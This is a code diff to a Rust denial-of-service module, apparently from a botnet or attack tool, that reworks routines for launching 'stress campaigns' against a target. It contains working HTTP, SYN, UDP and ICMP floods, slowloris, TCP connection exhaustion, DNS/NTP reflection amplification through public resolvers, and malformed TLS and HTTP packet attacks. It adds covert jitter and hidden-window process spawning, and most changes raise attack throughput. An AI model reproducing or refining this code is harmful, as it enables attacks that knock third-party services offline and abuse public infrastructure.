@@ -6,7 +6,6 @@ use rand::Rng;
 
 use super::covert_utils::CovertUtils;
 
-/// Thread-safe metrics shared across spawned tasks via Arc.
 #[derive(Default)]
 struct SharedMetrics {
     packets: AtomicU64,
@@ -31,7 +30,6 @@ impl DdosModule {
         }
     }
 
-    /// Start a stress campaign. Each method runs in its own tokio task.
     pub async fn start(&self, config: StressConfig) {
         let campaign_id = config.campaign_id.clone();
         *self.campaign_id.lock().await = campaign_id.clone();
@@ -49,7 +47,7 @@ impl DdosModule {
             tokio::spawn(async move {
                 match method.as_str() {
                     "httpFlood" => http_flood(metrics, &target, port, threads, max_conns, packet_size, &http_path).await,
-                    "synFlood" => syn_flood(metrics, &target, port, threads, packet_size).await,
+                    "synFlood" => syn_flood(metrics, &target, port, threads).await,
                     "udpFlood" => udp_flood(metrics, &target, port, threads, packet_size).await,
                     "icmpFlood" => icmp_flood(metrics, &target, threads, packet_size).await,
                     "slowloris" => slowloris(metrics, &target, port, threads, &http_path).await,
@@ -90,9 +88,7 @@ impl Default for DdosModule {
     }
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  HTTP Flood
-// ════════════════════════════════════════════════════════════════════════
+// ── HTTP Flood ───────────────────────────────────────────────────────────
 
 async fn http_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, max_conns: usize, packet_size: usize, http_path: &str) {
     let client = reqwest::Client::builder()
@@ -114,10 +110,7 @@ async fn http_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, thread
         tokio::spawn(async move {
             let _permit = permit;
             let is_post = { rand::thread_rng().gen_range(0..10) == 0 };
-            let url = format!(
-                "http://{}:{}{}?{}",
-                target, port, http_path, mk_uuid()
-            );
+            let url = format!("http://{}:{}{}?{}", target, port, http_path, mk_uuid());
 
             let bytes: u64;
             let req = if is_post {
@@ -145,116 +138,104 @@ async fn http_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, thread
     }
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  SYN Flood
-// ════════════════════════════════════════════════════════════════════════
+// ── SYN Flood (TCP connect-based, no raw socket needed) ─────────────────
 
-async fn syn_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, _packet_size: usize) {
-    for _ in 0..threads.min(50) {
+async fn syn_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32) {
+    let thread_count = threads.min(500);
+    let sem = Arc::new(tokio::sync::Semaphore::new(thread_count as usize));
+
+    loop {
+        let permit = sem.clone().acquire_owned().await.unwrap();
         let target = target.to_string();
         let metrics = metrics.clone();
+
         tokio::spawn(async move {
+            let _permit = permit;
+            // TCP connect-based SYN flood: rapid connect/disconnect
             loop {
-                let packet = build_syn_packet(&target, port);
-                metrics.packets.fetch_add(1, Ordering::Relaxed);
-                metrics.bytes.fetch_add(packet.len() as u64, Ordering::Relaxed);
-                tokio::time::sleep(std::time::Duration::from_millis(
-                    CovertUtils::random_jitter(1, 0.5),
-                ))
-                .await;
-            }
-        });
-    }
-}
-
-fn build_syn_packet(_dst_ip: &str, dst_port: u16) -> Vec<u8> {
-    let mut rng = rand::thread_rng();
-    let src_port = CovertUtils::random_source_port();
-    let seq: u32 = rng.gen();
-    let win = CovertUtils::random_tcp_window();
-    let tcp_len = 20 + rng.gen_range(0..40);
-    let mut packet = vec![0u8; tcp_len];
-    packet[0] = (src_port >> 8) as u8;
-    packet[1] = src_port as u8;
-    packet[2] = (dst_port >> 8) as u8;
-    packet[3] = dst_port as u8;
-    packet[4] = (seq >> 24) as u8;
-    packet[5] = (seq >> 16) as u8;
-    packet[6] = (seq >> 8) as u8;
-    packet[7] = seq as u8;
-    packet[13] = 0x02; // SYN
-    packet[14] = (win >> 8) as u8;
-    packet[15] = win as u8;
-    for i in 16..tcp_len {
-        packet[i] = rng.gen();
-    }
-    packet
-}
-
-// ════════════════════════════════════════════════════════════════════════
-//  UDP Flood
-// ════════════════════════════════════════════════════════════════════════
-
-async fn udp_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, packet_size: usize) {
-    for _ in 0..threads.min(100) {
-        let target = target.to_string();
-        let metrics = metrics.clone();
-        tokio::spawn(async move {
-            let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok();
-            let addr = format!("{}:{}", target, port);
-            loop {
-                if let Some(ref sock) = socket {
-                    let payload = CovertUtils::random_payload(64, packet_size);
-                    if let Ok(n) = sock.send_to(&payload, &addr) {
-                        metrics.packets.fetch_add(1, Ordering::Relaxed);
-                        metrics.bytes.fetch_add(n as u64, Ordering::Relaxed);
-                    }
+                if let Ok(_stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
+                    metrics.packets.fetch_add(1, Ordering::Relaxed);
+                    metrics.bytes.fetch_add(64, Ordering::Relaxed);
+                    // Stream dropped immediately → RST sent, connection released
                 }
             }
         });
     }
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  ICMP Flood
-// ════════════════════════════════════════════════════════════════════════
+// ── UDP Flood ────────────────────────────────────────────────────────────
+
+async fn udp_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, packet_size: usize) {
+    let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok();
+    if socket.is_none() {
+        eprintln!("[DDoS] UDP flood: cannot bind socket");
+        return;
+    }
+    let socket = Arc::new(socket.unwrap());
+    let addr = format!("{}:{}", target, port);
+
+    for _ in 0..threads.min(100) {
+        let socket = socket.clone();
+        let addr = addr.clone();
+        let metrics = metrics.clone();
+        tokio::task::spawn_blocking(move || {
+            loop {
+                let payload = CovertUtils::random_payload(64, packet_size);
+                if let Ok(n) = socket.send_to(&payload, &addr) {
+                    metrics.packets.fetch_add(1, Ordering::Relaxed);
+                    metrics.bytes.fetch_add(n as u64, Ordering::Relaxed);
+                }
+            }
+        });
+    }
+}
+
+// ── ICMP Flood ───────────────────────────────────────────────────────────
 
 async fn icmp_flood(metrics: Arc<SharedMetrics>, target: &str, threads: u32, packet_size: usize) {
-    for _ in 0..threads.min(50) {
+    // Run multiple concurrent ping processes for higher throughput
+    let thread_count = threads.min(100);
+    let payload_size = 32.min(packet_size.min(1472));
+
+    for _ in 0..thread_count {
         let target = target.to_string();
         let metrics = metrics.clone();
-        tokio::spawn(async move {
-            loop {
-                let payload_size = 32.min(packet_size.min(1472));
-                let payload = CovertUtils::random_payload(32, payload_size);
-                #[cfg(target_os = "windows")]
-                {
-                    use std::os::windows::process::CommandExt;
+        tokio::task::spawn_blocking(move || {
+            #[cfg(target_os = "windows")]
+            {
+                use std::os::windows::process::CommandExt;
+                loop {
+                    // Fire-and-forget: don't wait for response
                     let _ = std::process::Command::new("ping")
-                        .args(["-n", "1", "-w", "1000", &target])
+                        .args(["-n", "1", "-w", "500", &target])
                         .creation_flags(0x08000000)
                         .stdout(std::process::Stdio::null())
                         .stderr(std::process::Stdio::null())
-                        .status();
+                        .spawn();
+                    metrics.packets.fetch_add(1, Ordering::Relaxed);
+                    metrics.bytes.fetch_add(payload_size as u64 + 28, Ordering::Relaxed);
+                    // Minimal delay between spawns
+                    std::thread::sleep(std::time::Duration::from_millis(10));
                 }
-                #[cfg(not(target_os = "windows"))]
-                {
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                loop {
                     let _ = std::process::Command::new("ping")
                         .args(["-c", "1", "-W", "1", &target])
                         .stdout(std::process::Stdio::null())
                         .stderr(std::process::Stdio::null())
-                        .status();
+                        .spawn();
+                    metrics.packets.fetch_add(1, Ordering::Relaxed);
+                    metrics.bytes.fetch_add(payload_size as u64 + 28, Ordering::Relaxed);
+                    std::thread::sleep(std::time::Duration::from_millis(10));
                 }
-                metrics.packets.fetch_add(1, Ordering::Relaxed);
-                metrics.bytes.fetch_add(payload.len() as u64, Ordering::Relaxed);
             }
         });
     }
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  Slowloris
-// ════════════════════════════════════════════════════════════════════════
+// ── Slowloris ────────────────────────────────────────────────────────────
 
 async fn slowloris(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, http_path: &str) {
     let max_conns = threads.min(500);
@@ -283,12 +264,8 @@ async fn slowloris(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads
                     loop {
                         tokio::time::sleep(std::time::Duration::from_millis(
                             CovertUtils::random_jitter(5000, 0.5),
-                        ))
-                        .await;
-                        let drip = format!(
-                            "X-Random-{}: {}\r\n",
-                            mk_uuid(), mk_uuid()
-                        );
+                        )).await;
+                        let drip = format!("X-Random-{}: {}\r\n", mk_uuid(), mk_uuid());
                         let bytes = drip.into_bytes();
                         if stream.write_all(&bytes).await.is_err() {
                             break;
@@ -296,15 +273,13 @@ async fn slowloris(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads
                         metrics.bytes.fetch_add(bytes.len() as u64, Ordering::Relaxed);
                     }
                 }
-                metrics.conns.fetch_add(-1, Ordering::Relaxed);
+                metrics.conns.fetch_sub(1, Ordering::Relaxed);
             }
         });
     }
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  TCP Connection Flood
-// ════════════════════════════════════════════════════════════════════════
+// ── TCP Connection Flood ─────────────────────────────────────────────────
 
 async fn tcp_conn_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32) {
     let max_conns = threads.min(1000);
@@ -321,20 +296,18 @@ async fn tcp_conn_flood(metrics: Arc<SharedMetrics>, target: &str, port: u16, th
             if let Ok(_stream) = stream {
                 metrics.conns.fetch_add(1, Ordering::Relaxed);
                 metrics.packets.fetch_add(1, Ordering::Relaxed);
+                // Hold connection open
                 loop {
                     tokio::time::sleep(std::time::Duration::from_millis(
                         CovertUtils::random_jitter(30000, 0.2),
-                    ))
-                    .await;
+                    )).await;
                 }
             }
         });
     }
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  Reflection Amplification (DNS/NTP)
-// ════════════════════════════════════════════════════════════════════════
+// ── Reflection Amplification ─────────────────────────────────────────────
 
 const DNS_RESOLVERS: &[&str] = &[
     "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
@@ -369,13 +342,8 @@ async fn reflection_amp(metrics: Arc<SharedMetrics>, threads: u32) {
                     }
                 }
                 tokio::time::sleep(std::time::Duration::from_millis(
-                    if i % 2 == 0 {
-                        CovertUtils::random_jitter(50, 0.5)
-                    } else {
-                        CovertUtils::random_jitter(100, 0.5)
-                    },
-                ))
-                .await;
+                    if i % 2 == 0 { CovertUtils::random_jitter(50, 0.5) } else { CovertUtils::random_jitter(100, 0.5) },
+                )).await;
             }
         });
     }
@@ -403,9 +371,7 @@ fn build_ntp_monlist() -> Vec<u8> {
     ]
 }
 
-// ════════════════════════════════════════════════════════════════════════
-//  Malformed Protocol Packets
-// ════════════════════════════════════════════════════════════════════════
+// ── Malformed Protocol Packets ───────────────────────────────────────────
 
 async fn malformed_packet(metrics: Arc<SharedMetrics>, target: &str, port: u16, threads: u32, http_path: &str) {
     for i in 0..threads.min(50) {
@@ -415,14 +381,12 @@ async fn malformed_packet(metrics: Arc<SharedMetrics>, target: &str, port: u16, 
         tokio::spawn(async move {
             use tokio::io::AsyncWriteExt;
             loop {
-                match i % 3 {
+                let result = match i % 3 {
                     0 => {
                         if let Ok(mut stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
                             let tls = build_malformed_tls();
-                            let _ = stream.write_all(&tls).await;
-                            metrics.packets.fetch_add(1, Ordering::Relaxed);
-                            metrics.bytes.fetch_add(tls.len() as u64, Ordering::Relaxed);
-                        }
+                            stream.write_all(&tls).await.map(|_| tls.len())
+                        } else { Ok(0) }
                     }
                     1 => {
                         if let Ok(mut stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
@@ -431,18 +395,20 @@ async fn malformed_packet(metrics: Arc<SharedMetrics>, target: &str, port: u16, 
                                 http_path, target, "X".repeat(8192),
                             );
                             let bytes = data.into_bytes();
-                            let _ = stream.write_all(&bytes).await;
-                            metrics.packets.fetch_add(1, Ordering::Relaxed);
-                            metrics.bytes.fetch_add(bytes.len() as u64, Ordering::Relaxed);
-                        }
+                            stream.write_all(&bytes).await.map(|_| bytes.len())
+                        } else { Ok(0) }
                     }
                     _ => {
                         if let Ok(mut stream) = tokio::net::TcpStream::connect(format!("{}:{}", target, port)).await {
                             let garbage = CovertUtils::random_payload(256, 4096);
-                            let _ = stream.write_all(&garbage).await;
-                            metrics.packets.fetch_add(1, Ordering::Relaxed);
-                            metrics.bytes.fetch_add(garbage.len() as u64, Ordering::Relaxed);
-                        }
+                            stream.write_all(&garbage).await.map(|_| garbage.len())
+                        } else { Ok(0) }
+                    }
+                };
+                if let Ok(n) = result {
+                    if n > 0 {
+                        metrics.packets.fetch_add(1, Ordering::Relaxed);
+                        metrics.bytes.fetch_add(n as u64, Ordering::Relaxed);
                     }
                 }
             }
